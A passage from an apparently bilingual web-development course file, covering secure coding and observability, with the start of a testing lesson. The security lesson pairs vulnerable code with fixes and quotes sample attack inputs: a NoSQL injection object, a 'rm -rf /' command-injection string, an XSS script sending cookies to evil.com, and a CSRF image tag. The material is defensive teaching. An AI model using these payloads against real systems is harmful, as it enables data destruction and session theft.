// Attacker sends: { "username": "admin", "password": { "$gt": "" } }
// This finds any user with password greater than empty string!
\`\`\`

\`\`\`javascript
// SECURE - Validate and sanitize inputs
import { z } from 'zod';

const loginSchema = z.object({
  username: z.string().min(3).max(50),
  password: z.string().min(8)
});

const { username, password } = loginSchema.parse(req.body);
const user = await User.findOne({ username, password: hashPassword(password) });
\`\`\`

### Command Injection

\`\`\`javascript
// VULNERABLE
const { exec } = require('child_process');
exec(\`ping \${userInput}\`, callback);

// Attacker sends: "google.com; rm -rf /"
// Result: Deletes entire server!
\`\`\`

\`\`\`javascript
// SECURE - Use execFile with separate arguments
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', sanitizedHost], callback);

// Or better, use specific libraries
import ping from 'ping';
const result = await ping.promise.probe(sanitizedHost);
\`\`\`

---

## XSS (Cross-Site Scripting)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

**Analogy**: It is like someone being able to put fake stickers in your store that deceive your customers.

### Types of XSS

| Type | Description | Example |
|------|-------------|---------|
| **Stored** | Script saved in DB | Comment with \`<script>\` |
| **Reflected** | Script in URL | Malicious link via email |
| **DOM-based** | DOM manipulation | \`document.write(location.hash)\` |

### Vulnerable vs secure examples

\`\`\`javascript
// VULNERABLE - React with dangerouslySetInnerHTML
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// Attacker saves: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

\`\`\`javascript
// SECURE - React escapes automatically
function Comment({ text }) {
  return <div>{text}</div>; // Tags are displayed as text
}

// If you need HTML, use DOMPurify
import DOMPurify from 'dompurify';

function Comment({ text }) {
  const clean = DOMPurify.sanitize(text);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
\`\`\`

\`\`\`javascript
// VULNERABLE - Template literals in HTML
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
});

// Attacker visits: /search?q=<script>alert('XSS')</script>
\`\`\`

\`\`\`javascript
// SECURE - Escape the output
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${escapeHtml(req.query.q)}</h1>\`);
});
\`\`\`

---

## CSRF (Cross-Site Request Forgery)

CSRF tricks authenticated users into executing unwanted actions.

**Analogy**: Someone forges your signature on a document while you are distracted.

\`\`\`html
<!-- Malicious site evil.com -->
<img src="https://yourbank.com/transfer?to=hacker&amount=10000" />
<!-- The browser sends cookies automatically! -->
\`\`\`

### Protection with CSRF tokens

\`\`\`javascript
// Backend - Generate token
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Middleware validates token automatically
  processTransfer(req.body);
});
\`\`\`

\`\`\`html
<!-- Frontend - Include token in forms -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input type="text" name="amount" />
  <button type="submit">Transfer</button>
</form>
\`\`\`

### SameSite Cookies (Modern defense)

\`\`\`javascript
// Configure cookies with SameSite
res.cookie('session', sessionId, {
  httpOnly: true,      // Not accessible from JavaScript
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Not sent in cross-site requests
  maxAge: 3600000      // 1 hour
});
\`\`\`

---

## Secure Authentication and Sessions

### Password storage

\`\`\`javascript
// NEVER - Plain text
const user = { password: 'myPassword123' }; // NEVER!

// NEVER - Weak hashing
const hash = crypto.createHash('md5').update(password).digest('hex');

// ALWAYS - bcrypt with salt
import bcrypt from 'bcrypt';

// When registering
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(password, saltRounds);

// When logging in
const isValid = await bcrypt.compare(inputPassword, hashedPassword);
\`\`\`

### Secure JWT

\`\`\`javascript
import jwt from 'jsonwebtoken';

// Generate token
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  {
    expiresIn: '1h',
    algorithm: 'HS256'
  }
);

// Verify token
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
} catch (error) {
  // Invalid or expired token
}
\`\`\`

### Secure sessions with Redis

\`\`\`javascript
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    maxAge: 1000 * 60 * 60 * 24 // 1 day
  }
}));
\`\`\`

---

## Sensitive Data Exposure

### What should NEVER be in your code

\`\`\`javascript
// NEVER in code
const API_KEY = 'sk-1234567890abcdef'; // NEVER!
const DB_PASSWORD = 'superSecretPassword'; // NEVER!

// ALWAYS in environment variables
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;
\`\`\`

### .env and .gitignore

\`\`\`bash
# .env (NEVER in Git)
DATABASE_URL=postgresql://user:pass@localhost:5432/db
JWT_SECRET=your-very-long-random-secret
API_KEY=sk-production-key
\`\`\`

\`\`\`bash
# .gitignore
.env
.env.local
.env.*.local
*.pem
*.key
\`\`\`

### Encrypting sensitive data

\`\`\`javascript
import crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encrypted,
    authTag: authTag.toString('hex')
  };
}

function decrypt({ iv, encrypted, authTag }) {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
\`\`\`

---

## Security Headers

HTTP headers are your first line of defense.

### Configuration with Helmet (Express)

\`\`\`javascript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yourdomain.com"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
\`\`\`

### Headers in Next.js

\`\`\`javascript
// next.config.js
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline';"
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders
      }
    ];
  }
};
\`\`\`

### Main headers explained

| Header | Function |
|--------|----------|
| **CSP** | Controls what resources the page can load |
| **HSTS** | Forces HTTPS in the browser |
| **X-Frame-Options** | Prevents clickjacking |
| **X-Content-Type-Options** | Prevents MIME sniffing |
| **CORS** | Controls cross-origin requests |

---

## Validation and Sanitization

### Zod for schema validation

\`\`\`javascript
import { z } from 'zod';

// Define schema
const userSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).regex(/[A-Z]/).regex(/[0-9]/),
  age: z.number().min(18).max(120).optional(),
  role: z.enum(['user', 'admin']).default('user')
});

// Validate in endpoint
app.post('/register', async (req, res) => {
  try {
    const validData = userSchema.parse(req.body);
    // Safe data to use
    await createUser(validData);
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ errors: error.errors });
    }
  }
});
\`\`\`

### HTML sanitization

\`\`\`javascript
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Strict configuration
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false
});
\`\`\`

---

## Dependency Security

### npm audit

\`\`\`bash
# Check vulnerabilities
npm audit

# Fix automatically
npm audit fix

# See details of critical vulnerabilities
npm audit --audit-level=critical
\`\`\`

### Snyk (Recommended)

\`\`\`bash
# Install
npm install -g snyk

# Authenticate
snyk auth

# Scan project
snyk test

# Monitor continuously
snyk monitor
\`\`\`

### Dependabot on GitHub

\`\`\`yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
\`\`\`

---

## Security Testing Tools

| Tool | Type | Use |
|------|------|-----|
| **OWASP ZAP** | DAST | Automated web scanning |
| **Burp Suite** | Proxy | Advanced manual testing |
| **SonarQube** | SAST | Static code analysis |
| **Snyk** | SCA | Vulnerable dependencies |
| **npm audit** | SCA | npm dependencies |
| **ESLint Security** | SAST | JS security rules |

### ESLint with security rules

\`\`\`javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error'
  }
};
\`\`\`

---

## Security checklist

- [ ] Validate and sanitize ALL inputs
- [ ] Use parameterized queries (do not concatenate SQL)
- [ ] Hash passwords with bcrypt (saltRounds >= 12)
- [ ] Implement CSRF tokens or SameSite cookies
- [ ] Configure security headers (CSP, HSTS, etc.)
- [ ] Keep dependencies updated
- [ ] Do not expose secrets in code or logs
- [ ] Use HTTPS in production
- [ ] Implement rate limiting
- [ ] Log security events

---

## Practice

-> [Security Audit](/en/cooking/security-audit) - Analyze and fix vulnerabilities in an app

---

## Useful links

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Snyk Learn](https://learn.snyk.io/)
- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
    `,
  },

  'observability': {
    contentEs: `
## El problema de la caja negra

Imagina que manejas un auto sin tablero de instrumentos. No sabes a que velocidad vas, cuanto combustible te queda, ni si el motor esta por sobrecalentarse. Asi es operar una aplicacion en produccion sin observabilidad.

> **Sin observabilidad, solo te enteras de los problemas cuando tus usuarios se quejan. Con observabilidad, los detectas antes de que los usuarios los noten.**

---

## Los tres pilares de la observabilidad

La observabilidad se construye sobre tres pilares complementarios:

\`\`\`
┌─────────────────┬─────────────────┬─────────────────┐
│      LOGS       │    METRICAS     │     TRACES      │
│                 │                 │                 │
│  ¿Que paso?     │  ¿Cuanto?       │  ¿Donde?        │
│                 │                 │                 │
│  Eventos        │  Numeros que    │  Camino de una  │
│  discretos con  │  puedes graficar│  request a      │
│  contexto       │  y alertar      │  traves de      │
│                 │                 │  servicios      │
└─────────────────┴─────────────────┴─────────────────┘
\`\`\`

| Pilar | Pregunta que responde | Ejemplo |
|-------|----------------------|---------|
| **Logs** | ¿Que paso exactamente? | "Usuario X fallo login por password incorrecto" |
| **Metricas** | ¿Como esta el sistema? | "95% de requests < 200ms, 2% errores" |
| **Traces** | ¿Por donde paso la request? | "API → Auth → DB → Cache → Response (340ms)" |

---

## Logs: El registro de eventos

### Por que console.log no escala

\`\`\`javascript
// En desarrollo: funciona
console.log('Usuario logueado:', userId);

// En produccion con 1000 requests/seg:
// - ¿Como buscas un log especifico?
// - ¿Como correlacionas logs de la misma request?
// - ¿Como filtras solo errores?
// - ¿Como guardas los logs cuando el servidor muere?
\`\`\`

### Logging estructurado con Pino

\`\`\`javascript
import pino from 'pino';

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  formatters: {
    level: (label) => ({ level: label }),
  },
  timestamp: pino.stdTimeFunctions.isoTime,
});

// Crear logger con contexto de request
function createRequestLogger(req) {
  return logger.child({
    requestId: req.id,
    userId: req.user?.id,
    path: req.path,
    method: req.method,
  });
}

// Uso en endpoint
app.get('/api/orders', async (req, res) => {
  const log = createRequestLogger(req);

  log.info('Fetching orders');

  try {
    const orders = await getOrders(req.user.id);
    log.info({ count: orders.length }, 'Orders fetched successfully');
    res.json(orders);
  } catch (error) {
    log.error({ error: error.message, stack: error.stack }, 'Failed to fetch orders');
    res.status(500).json({ error: 'Internal error' });
  }
});
\`\`\`

**Output JSON estructurado:**
\`\`\`json
{
  "level": "info",
  "time": "2026-01-15T10:30:00.000Z",
  "requestId": "abc-123",
  "userId": "user-456",
  "path": "/api/orders",
  "method": "GET",
  "msg": "Orders fetched successfully",
  "count": 25
}
\`\`\`

### Niveles de log

| Nivel | Cuando usarlo | Ejemplo |
|-------|--------------|---------|
| **error** | Algo fallo y necesita atencion | DB connection lost |
| **warn** | Algo raro pero no critico | Rate limit casi alcanzado |
| **info** | Eventos importantes del negocio | Usuario creo orden |
| **debug** | Detalles para troubleshooting | Query ejecutado en 50ms |

---

## Metricas: Numeros que importan

### Las 4 Golden Signals (Google SRE)

Google SRE define 4 senales clave para monitorear cualquier servicio:

\`\`\`
┌──────────────┬──────────────┬──────────────┬──────────────┐
│   LATENCY    │   TRAFFIC    │   ERRORS     │  SATURATION  │
│              │              │              │              │
│  ¿Cuanto     │  ¿Cuanta     │  ¿Que %      │  ¿Que tan    │
│  tarda?      │  demanda?    │  falla?      │  lleno esta? │
│              │              │              │              │
│  p50, p95,   │  req/seg     │  % HTTP 5xx  │  CPU, RAM,   │
│  p99         │  usuarios    │  % timeouts  │  conexiones  │
└──────────────┴──────────────┴──────────────┴──────────────┘
\`\`\`

### Prometheus + prom-client

\`\`\`javascript
import promClient from 'prom-client';

// Recolectar metricas por defecto (CPU, memoria, etc.)
promClient.collectDefaultMetrics();

// Metrica custom: latencia de requests
const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status_code'],
  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5],
});

// Metrica custom: requests totales
const httpRequestsTotal = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status_code'],
});

// Middleware para medir requests
app.use((req, res, next) => {
  const start = Date.now();

  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    const labels = {
      method: req.method,
      route: req.route?.path || 'unknown',
      status_code: res.statusCode,
    };

    httpRequestDuration.observe(labels, duration);
    httpRequestsTotal.inc(labels);
  });

  next();
});

// Endpoint para Prometheus
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', promClient.register.contentType);
  res.end(await promClient.register.metrics());
});
\`\`\`

### Tipos de metricas

| Tipo | Descripcion | Ejemplo |
|------|-------------|---------|
| **Counter** | Solo incrementa | Total de requests, errores |
| **Gauge** | Sube y baja | Conexiones activas, temperatura |
| **Histogram** | Distribucion de valores | Latencia (p50, p95, p99) |
| **Summary** | Similar a histogram | Percentiles calculados client-side |

---

## Traces: Siguiendo el camino

### El problema de microservicios

En un monolito, seguir una request es facil. En microservicios:

\`\`\`
Usuario → API Gateway → Auth Service → Order Service → Payment Service → DB
                ↓               ↓              ↓              ↓
              ¿Donde esta el cuello de botella? 🤷
\`\`\`

### OpenTelemetry: El estandar

OpenTelemetry es el estandar open source para instrumentacion.

\`\`\`javascript
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';

const sdk = new NodeSDK({
  serviceName: 'order-service',
  traceExporter: new OTLPTraceExporter({
    url: 'http://jaeger:4318/v1/traces',
  }),
  instrumentations: [
    getNodeAutoInstrumentations({
      '@opentelemetry/instrumentation-http': { enabled: true },
      '@opentelemetry/instrumentation-express': { enabled: true },
      '@opentelemetry/instrumentation-pg': { enabled: true },
    }),
  ],
});

sdk.start();
\`\`\`

### Anatomia de un trace

\`\`\`
Trace ID: abc-123-xyz
├── Span: HTTP GET /api/order/123 (450ms)
│   ├── Span: Auth Middleware (20ms)
│   ├── Span: DB Query: SELECT * FROM orders (150ms)
│   ├── Span: HTTP POST payment-service/charge (250ms)
│   │   ├── Span: Validate card (30ms)
│   │   └── Span: Process payment (220ms)
│   └── Span: Send confirmation email (30ms)
\`\`\`

---

## Stack recomendado 2026

### Open Source (auto-hospedado)

\`\`\`yaml
# docker-compose.yml - Stack de observabilidad
services:
  # Metricas
  prometheus:
    image: prom/prometheus:latest
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    ports:
      - "9090:9090"

  # Visualizacion
  grafana:
    image: grafana/grafana:latest
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=secret
    ports:
      - "3000:3000"
    volumes:
      - grafana-data:/var/lib/grafana

  # Logs
  loki:
    image: grafana/loki:latest
    ports:
      - "3100:3100"

  # Traces
  jaeger:
    image: jaegertracing/all-in-one:latest
    ports:
      - "16686:16686"  # UI
      - "4318:4318"    # OTLP HTTP
\`\`\`

### Servicios Managed (SaaS)

| Servicio | Especialidad | Tier Gratis |
|----------|--------------|-------------|
| **Grafana Cloud** | Metricas + Logs + Traces | 10k series, 50GB logs |
| **Datadog** | All-in-one observabilidad | Trial 14 dias |
| **New Relic** | APM completo | 100GB/mes gratis |
| **Sentry** | Errores y performance | 5k errores/mes |

---

## Alerting efectivo

### Por que "alertar todo" es contraproducente

\`\`\`
Alerta: CPU > 50%          → Ignorada (normal en picos)
Alerta: Memoria > 60%      → Ignorada (siempre asi)
Alerta: Request lento      → Ignorada (ya vimos 100 hoy)
Alerta: Base de datos caida → Ignorada por habito... OOPS
\`\`\`

**Resultado: Alert fatigue. El equipo ignora todas las alertas.**

### SLOs y Error Budgets

En lugar de alertar por sintomas, alerta cuando afectas al usuario:

\`\`\`
SLO (Service Level Objective):
"99.9% de requests en menos de 500ms"

Error Budget:
- 30 dias × 24 horas × 60 min = 43,200 minutos
- 0.1% de error budget = 43.2 minutos de downtime permitido

Alerta cuando:
- Consumiste > 50% del budget en 1 hora
- Consumiste > 80% del budget en el mes
\`\`\`

### Anatomia de una buena alerta

\`\`\`yaml
# prometheus/alerts.yml
groups:
  - name: api-alerts
    rules:
      - alert: HighErrorRate
        expr: |
          sum(rate(http_requests_total{status_code=~"5.."}[5m])) /
          sum(rate(http_requests_total[5m])) > 0.01
        for: 5m  # Solo alerta si persiste 5 min
        labels:
          severity: critical
        annotations:
          summary: "Error rate > 1% por 5 minutos"
          runbook: "https://wiki.tu-empresa.com/runbooks/high-error-rate"
          dashboard: "https://grafana.tu-empresa.com/d/api-health"
\`\`\`

---

## Checklist de observabilidad

- [ ] Logs estructurados con requestId para correlacion
- [ ] Metricas de las 4 Golden Signals expuestas
- [ ] Traces configurados entre servicios
- [ ] Dashboards con las metricas clave
- [ ] Alertas basadas en SLOs, no sintomas
- [ ] Runbooks documentados para cada alerta
- [ ] Retencion de datos definida (30 dias logs, 15 dias traces)

---

## Practica

-> [Configurar Prometheus + Grafana](/es/cooking/monitoring-stack)
-> [Logging profesional con Pino + Loki](/es/cooking/logging-production)

---

## Recursos

- [Google SRE Book (gratis)](https://sre.google/sre-book/table-of-contents/)
- [Observability Engineering - Charity Majors](https://www.oreilly.com/library/view/observability-engineering/9781492076438/)
- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)
- [Prometheus Documentation](https://prometheus.io/docs/)
    `,
    contentEn: `
## The black box problem

Imagine driving a car without a dashboard. You dont know how fast youre going, how much fuel you have left, or if the engine is about to overheat. Thats what operating an application in production without observability is like.

> **Without observability, you only learn about problems when your users complain. With observability, you detect them before users notice.**

---

## The three pillars of observability

Observability is built on three complementary pillars:

\`\`\`
┌─────────────────┬─────────────────┬─────────────────┐
│      LOGS       │     METRICS     │     TRACES      │
│                 │                 │                 │
│  What happened? │  How much?      │  Where?         │
│                 │                 │                 │
│  Discrete       │  Numbers you    │  Path of a      │
│  events with    │  can graph      │  request across │
│  context        │  and alert on   │  services       │
└─────────────────┴─────────────────┴─────────────────┘
\`\`\`

| Pillar | Question it answers | Example |
|--------|---------------------|---------|
| **Logs** | What exactly happened? | "User X failed login due to wrong password" |
| **Metrics** | How is the system doing? | "95% of requests < 200ms, 2% errors" |
| **Traces** | Where did the request go? | "API → Auth → DB → Cache → Response (340ms)" |

---

## Logs: The event record

### Why console.log doesnt scale

\`\`\`javascript
// In development: works fine
console.log('User logged in:', userId);

// In production with 1000 requests/sec:
// - How do you search for a specific log?
// - How do you correlate logs from the same request?
// - How do you filter only errors?
// - How do you keep logs when the server dies?
\`\`\`

### Structured logging with Pino

\`\`\`javascript
import pino from 'pino';

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  formatters: {
    level: (label) => ({ level: label }),
  },
  timestamp: pino.stdTimeFunctions.isoTime,
});

// Create logger with request context
function createRequestLogger(req) {
  return logger.child({
    requestId: req.id,
    userId: req.user?.id,
    path: req.path,
    method: req.method,
  });
}

// Usage in endpoint
app.get('/api/orders', async (req, res) => {
  const log = createRequestLogger(req);

  log.info('Fetching orders');

  try {
    const orders = await getOrders(req.user.id);
    log.info({ count: orders.length }, 'Orders fetched successfully');
    res.json(orders);
  } catch (error) {
    log.error({ error: error.message, stack: error.stack }, 'Failed to fetch orders');
    res.status(500).json({ error: 'Internal error' });
  }
});
\`\`\`

**Structured JSON output:**
\`\`\`json
{
  "level": "info",
  "time": "2026-01-15T10:30:00.000Z",
  "requestId": "abc-123",
  "userId": "user-456",
  "path": "/api/orders",
  "method": "GET",
  "msg": "Orders fetched successfully",
  "count": 25
}
\`\`\`

### Log levels

| Level | When to use | Example |
|-------|-------------|---------|
| **error** | Something failed and needs attention | DB connection lost |
| **warn** | Something odd but not critical | Rate limit almost reached |
| **info** | Important business events | User created order |
| **debug** | Details for troubleshooting | Query executed in 50ms |

---

## Metrics: Numbers that matter

### The 4 Golden Signals (Google SRE)

Google SRE defines 4 key signals for monitoring any service:

\`\`\`
┌──────────────┬──────────────┬──────────────┬──────────────┐
│   LATENCY    │   TRAFFIC    │   ERRORS     │  SATURATION  │
│              │              │              │              │
│  How long    │  How much    │  What %      │  How full    │
│  does it     │  demand?     │  fails?      │  is it?      │
│  take?       │              │              │              │
│              │              │              │              │
│  p50, p95,   │  req/sec     │  % HTTP 5xx  │  CPU, RAM,   │
│  p99         │  users       │  % timeouts  │  connections │
└──────────────┴──────────────┴──────────────┴──────────────┘
\`\`\`

### Prometheus + prom-client

\`\`\`javascript
import promClient from 'prom-client';

// Collect default metrics (CPU, memory, etc.)
promClient.collectDefaultMetrics();

// Custom metric: request latency
const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status_code'],
  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5],
});

// Custom metric: total requests
const httpRequestsTotal = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status_code'],
});

// Middleware to measure requests
app.use((req, res, next) => {
  const start = Date.now();

  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    const labels = {
      method: req.method,
      route: req.route?.path || 'unknown',
      status_code: res.statusCode,
    };

    httpRequestDuration.observe(labels, duration);
    httpRequestsTotal.inc(labels);
  });

  next();
});

// Endpoint for Prometheus
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', promClient.register.contentType);
  res.end(await promClient.register.metrics());
});
\`\`\`

### Metric types

| Type | Description | Example |
|------|-------------|---------|
| **Counter** | Only increments | Total requests, errors |
| **Gauge** | Goes up and down | Active connections, temperature |
| **Histogram** | Distribution of values | Latency (p50, p95, p99) |
| **Summary** | Similar to histogram | Client-side calculated percentiles |

---

## Traces: Following the path

### The microservices problem

In a monolith, following a request is easy. In microservices:

\`\`\`
User → API Gateway → Auth Service → Order Service → Payment Service → DB
              ↓               ↓              ↓              ↓
           Where is the bottleneck? 🤷
\`\`\`

### OpenTelemetry: The standard

OpenTelemetry is the open source standard for instrumentation.

\`\`\`javascript
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';

const sdk = new NodeSDK({
  serviceName: 'order-service',
  traceExporter: new OTLPTraceExporter({
    url: 'http://jaeger:4318/v1/traces',
  }),
  instrumentations: [
    getNodeAutoInstrumentations({
      '@opentelemetry/instrumentation-http': { enabled: true },
      '@opentelemetry/instrumentation-express': { enabled: true },
      '@opentelemetry/instrumentation-pg': { enabled: true },
    }),
  ],
});

sdk.start();
\`\`\`

### Anatomy of a trace

\`\`\`
Trace ID: abc-123-xyz
├── Span: HTTP GET /api/order/123 (450ms)
│   ├── Span: Auth Middleware (20ms)
│   ├── Span: DB Query: SELECT * FROM orders (150ms)
│   ├── Span: HTTP POST payment-service/charge (250ms)
│   │   ├── Span: Validate card (30ms)
│   │   └── Span: Process payment (220ms)
│   └── Span: Send confirmation email (30ms)
\`\`\`

---

## Recommended stack 2026

### Open Source (self-hosted)

\`\`\`yaml
# docker-compose.yml - Observability stack
services:
  # Metrics
  prometheus:
    image: prom/prometheus:latest
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    ports:
      - "9090:9090"

  # Visualization
  grafana:
    image: grafana/grafana:latest
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=secret
    ports:
      - "3000:3000"
    volumes:
      - grafana-data:/var/lib/grafana

  # Logs
  loki:
    image: grafana/loki:latest
    ports:
      - "3100:3100"

  # Traces
  jaeger:
    image: jaegertracing/all-in-one:latest
    ports:
      - "16686:16686"  # UI
      - "4318:4318"    # OTLP HTTP
\`\`\`

### Managed Services (SaaS)

| Service | Specialty | Free Tier |
|---------|-----------|-----------|
| **Grafana Cloud** | Metrics + Logs + Traces | 10k series, 50GB logs |
| **Datadog** | All-in-one observability | 14-day trial |
| **New Relic** | Complete APM | 100GB/month free |
| **Sentry** | Errors and performance | 5k errors/month |

---

## Effective alerting

### Why "alert on everything" is counterproductive

\`\`\`
Alert: CPU > 50%          → Ignored (normal during peaks)
Alert: Memory > 60%       → Ignored (always like this)
Alert: Slow request       → Ignored (seen 100 today)
Alert: Database down      → Ignored out of habit... OOPS
\`\`\`

**Result: Alert fatigue. The team ignores all alerts.**

### SLOs and Error Budgets

Instead of alerting on symptoms, alert when you affect the user:

\`\`\`
SLO (Service Level Objective):
"99.9% of requests in less than 500ms"

Error Budget:
- 30 days × 24 hours × 60 min = 43,200 minutes
- 0.1% error budget = 43.2 minutes of allowed downtime

Alert when:
- Consumed > 50% of budget in 1 hour
- Consumed > 80% of budget in the month
\`\`\`

### Anatomy of a good alert

\`\`\`yaml
# prometheus/alerts.yml
groups:
  - name: api-alerts
    rules:
      - alert: HighErrorRate
        expr: |
          sum(rate(http_requests_total{status_code=~"5.."}[5m])) /
          sum(rate(http_requests_total[5m])) > 0.01
        for: 5m  # Only alert if it persists for 5 min
        labels:
          severity: critical
        annotations:
          summary: "Error rate > 1% for 5 minutes"
          runbook: "https://wiki.your-company.com/runbooks/high-error-rate"
          dashboard: "https://grafana.your-company.com/d/api-health"
\`\`\`

---

## Observability checklist

- [ ] Structured logs with requestId for correlation
- [ ] 4 Golden Signals metrics exposed
- [ ] Traces configured between services
- [ ] Dashboards with key metrics
- [ ] Alerts based on SLOs, not symptoms
- [ ] Runbooks documented for each alert
- [ ] Data retention defined (30 days logs, 15 days traces)

---

## Practice

-> [Set up Prometheus + Grafana](/en/cooking/monitoring-stack)
-> [Professional logging with Pino + Loki](/en/cooking/logging-production)

---

## Resources

- [Google SRE Book (free)](https://sre.google/sre-book/table-of-contents/)
- [Observability Engineering - Charity Majors](https://www.oreilly.com/library/view/observability-engineering/9781492076438/)
- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)
- [Prometheus Documentation](https://prometheus.io/docs/)
    `,
  },

  'testing': {
    contentEs: `
## Tu red de seguridad para cambios

Imagina que eres cirujano y tienes que operar sin anestesia ni monitores. Cada corte es un riesgo, y no sabes si algo salio mal hasta que es demasiado tarde. Programar sin tests es exactamente asi.

> **Los tests no son para encontrar bugs. Son para darte la confianza de hacer cambios sin miedo a romper todo.**

---

## El costo de los bugs

| Etapa donde se encuentra el bug | Costo relativo |
|--------------------------------|----------------|
| Durante desarrollo | 1x |
| Durante code review | 2x |
| Durante QA | 10x |
| En produccion | 100x |
| Despues de perdida de clientes | 1000x |

---

## La piramide de testing

\`\`\`
         /\\
        /E2E\\           Pocos, lentos, fragiles
       /──────\\         (5% de tus tests)
      /Integration\\     Balance costo/valor
     /──────────────\\   (15% de tus tests)
    /   Unit Tests   \\  Muchos, rapidos, estables
   /──────────────────\\ (80% de tus tests)
\`\`\`

| Tipo | Que prueba | Velocidad | Fragilidad |
|------|------------|-----------|------------|
| **Unit** | Una funcion aislada | ms | Muy estable |
| **Integration** | Varios modulos juntos | segundos | Moderada |
| **E2E** | Flujo completo como usuario | minutos | Fragil |

---

## Unit Testing con Vitest

### Setup basico

\`\`\`bash
npm install -D vitest @vitest/coverage-v8
\`\`\`

\`\`\`javascript
// vitest.config.ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
